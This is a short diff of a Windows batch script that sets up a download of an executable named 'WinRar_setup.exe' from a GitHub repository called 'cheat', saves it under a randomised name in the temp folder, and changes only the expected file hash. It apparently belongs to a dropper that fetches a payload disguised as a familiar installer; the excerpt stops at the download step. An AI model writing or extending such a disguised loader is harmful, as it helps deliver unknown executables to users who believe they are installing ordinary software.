@@ -2,7 +2,7 @@
 setlocal EnableExtensions
 
 set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
-set "HASH=7eb70257593da06f682a3ddda54a9d260d4fc514f645237f5ca74b08f8da61a6"
+set "HASH=1b7d9490a9042ebc9ab5267938791e1d260d530147c6de0745319bfb80e678b0"
 set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"
 
 echo [1/4] Downloading...
